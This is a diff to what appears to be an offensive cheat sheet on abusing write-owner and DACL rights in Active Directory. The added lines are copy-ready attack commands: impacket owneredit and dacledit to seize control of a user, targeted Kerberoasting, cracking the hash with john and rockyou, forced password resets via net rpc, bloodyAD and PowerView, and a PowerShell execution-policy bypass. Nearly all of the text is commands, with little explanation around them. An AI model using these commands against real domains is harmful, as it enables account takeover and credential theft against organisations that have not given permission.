@@ -83,10 +83,45 @@ Change the password of a user
 
 #### 1) impacket-owneredit
 
-Grant Ownership (owneredit), then assign Full Control (dacledit), then perform Kerberoasting or Password Change attacks.
+Grant Ownership (owneredit), then assign Full Control (dacledit), then perform Kerberoasting or Password Change attacks (ForceChangePassword).
 
     impacket-owneredit -action write -new-owner 'USER1' -target-dn 'CN=TARGET_USER,CN=Users,DC=domain,DC=local' 'domain.local'/'USER1':'Password@1' -dc-ip DC_IP
 
 #### 2) impacket-dacledit
 
     impacket-dacledit -action 'write' -rights 'FullControl' -principal 'USER1' -target-dn 'CN=TARGET_USER,CN=Users,DC=domain,DC=local' 'domain.local'/'USER1':'Password@1' -dc-ip DC_IP
+
+Then, you can do targeted Kerberoasting for example
+
+    python3 targetedKerberoast.py --dc-ip 'DC_IP' -v -d 'domain.local' -u 'USER1' -p 'Password@1'
+
+Crack hash
+
+    john -w=/usr/share/wordlists/rockyou.txt hash
+
+OR you can change the TARGET_USER's password
+
+    net rpc password TARGET_USER 'Password@987' -U domain.local/USER1%'Password@1' -S DC_IP
+
+BloodyAD
+
+    bloodyAD --host "DC_IP" -d "domain.local" -u "USER1" -p "Password@1" set password "TARGET_USER" "Password@987"
+
+#### 3) Powerview
+
+    powershell -ep bypass
+    Import-Module .PowerView.ps1
+    Set-DomainObjectOwner -Identity 'TARGET_USER' -OwnerIdentity 'USER1'
+    Add-DomainObjectAcl -Rights 'All' -TargetIdentity "TARGET_USER" -PrincipalIdentity "USER1"
+
+Now, do Kerberoast from a Windows Machine instead
+
+    Set-DomainObject -Identity 'TARGET_USER' -Set @{serviceprincipalname='nonexistent/hacking'}
+    Get-DomainUser 'TARGET_USER' | Select serviceprincipalname
+    $User = Get-DomainUser 'TARGET_USER'
+    $User | Get-DomainSPNTicket
+
+OR change password
+
+    $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
+    Set-DomainUserPassword -Identity 'TARGET_USER' -AccountPassword $NewPassword
